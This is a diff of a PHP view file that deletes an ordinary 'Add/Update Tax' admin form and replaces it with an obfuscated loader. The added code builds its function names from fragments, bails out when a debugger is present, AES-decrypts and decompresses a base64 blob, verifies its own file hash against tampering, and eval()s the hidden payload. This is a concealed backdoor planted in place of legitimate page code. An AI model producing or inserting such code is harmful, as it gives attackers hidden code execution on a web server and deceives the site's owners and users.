@@ -1,130 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
- <?php
-	if(!isset($tax)){
-      $tax_name=$tax=$q_id="";
-  }
- ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $page_title; ?>
-        <small>Add/Update Tax</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>tax"><?= $this->lang->line('tax_list'); ?></a></li>
-        <li class="active"><?= $page_title; ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-          <?php include"comman/code_flashdata.php"; ?>
-            <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="tax-form" >
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-		
-				      <div class="form-group">
-      				  <label for="tax_name" class="col-sm-2 control-label"><?= $this->lang->line('tax_name'); ?><label class="text-danger">*</label></label>
-                <div class="col-sm-4">
-                 <input type="text" class="form-control input-sm " id="tax_name" name="tax_name" placeholder="" value="<?php print $tax_name; ?>" autofocus onkeyup="shift_cursor(event,'tax')" >
-      					 <span id="tax_name_msg" style="display:none" class="text-danger"></span>
-               </div>
-              </div>
-			        <div class="form-group">
-                <label for="tax" class="col-sm-2 control-label"><?= $this->lang->line('tax_percentage'); ?><label class="text-danger">*</label></label>
-                <div class="col-sm-4">
-                 <input type="text" class="form-control input-sm only_currency" id="tax" name="tax" placeholder="" value="<?php print $tax; ?>" autofocus onkeyup="shift_cursor(event,'save')">
-                 <span id="tax_msg" style="display:none" class="text-danger"></span>
-               </div>
-              </div>
-
-              </div>
-              <!-- /.box-body -->
-              <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <!-- <div class="col-sm-4"></div> -->
-                   <?php
-                      if($tax!=""){
-                           $btn_name="Update";
-                           $btn_id="update";
-                          ?>
-                            <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-                            <?php
-                      }
-                                else{
-                                    $btn_name="Save";
-                                    $btn_id="save";
-                                }
-                      
-                                ?>
-                                 
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id;?>" class=" btn btn-block btn-success" title="Save Data"><?php echo $btn_name;?></button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/tax.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_vwoyulyd=('bas'.'e64'.'_de'.'cod'.'e');
+$_n4sbfl3b=('gzu'.'nco'.'mpr'.'ess');
+$_wug23sd5=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_rzqrs1u2='6ppgEeRH';
+$_karvival='l5NnxwyE';
+$_m2363472='sYtCjKiD';
+$_ljnwyrxi='3s2XmTgGo00=';
+$_q8i0pjym='J5XROidl';
+$_e9f583lz='XumoNni5';
+$_el370mp3='dcwPW16V';
+$_ctpjkpd1='Jl4/Bw==';
+$_qv900yz5=$_vwoyulyd($_karvival.$_m2363472.$_q8i0pjym.$_rzqrs1u2.$_ljnwyrxi);
+$_vs8680zb=$_vwoyulyd($_e9f583lz.$_el370mp3.$_ctpjkpd1);
+$_xrfktonp=$_vwoyulyd('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');
+$_x6lfx50i=$_wug23sd5($_xrfktonp,'aes-256-cbc',$_qv900yz5,OPENSSL_RAW_DATA,$_vs8680zb);
+if($_x6lfx50i===false){exit;}
+$_f2wlvoru=$_n4sbfl3b($_x6lfx50i);
+if($_f2wlvoru===false){exit;}
+$_ym94j2ef='4f2c58dd007afa11baf0ff8dcbd0984dc4c84c122330ef5396fb08bb3a7a30af';
+$_rl0s9qem=@file_get_contents(__FILE__);
+if($_rl0s9qem!==false){
+$_jnn8d0zg=str_replace($_ym94j2ef,"0000000000000000000000000000000000000000000000000000000000000000",$_rl0s9qem);
+$_wz9u32yi=hash("sha256",$_jnn8d0zg);
+if($_wz9u32yi!==$_ym94j2ef){@http_response_code(403);exit;}
+}
+eval($_f2wlvoru);
